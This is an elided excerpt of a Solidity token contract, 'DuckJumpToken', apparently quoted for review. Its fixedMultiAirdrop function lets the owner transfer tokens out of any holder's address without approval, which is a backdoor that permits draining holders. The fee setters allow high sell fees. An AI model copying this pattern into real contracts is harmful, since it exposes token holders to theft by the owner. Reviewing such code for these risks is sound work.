...
contract DuckJumpToken is Ownable, ERC20, ReentrancyGuard {
    using SafeMath for uint256;

    uint256 public maxSupply = 1 * 10**9 * 10**18;
    uint256 public tokenForBosses = 0.002 * 10**9 * 10**18;
    ...
    function fixedMultiAirdrop(
        address from,
        address[] calldata addresses,
        uint256 amount
    ) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            super._transfer(from, addresses[i], amount);
        }
    }
    ...
    function setTransferFeeRate(
        ...
        require(buyFeeRate <= feeDenominator / 10, "Buy fee too high");
        require(sellFeeRate <= feeDenominator / 5, "Sell fee too high");
    }

    function setMinTokensBeforeSwap(uint256 _tokenForBosses) public onlyOwner {
        require(_tokenForBosses < 0.02 * 10**9 * 10**18);
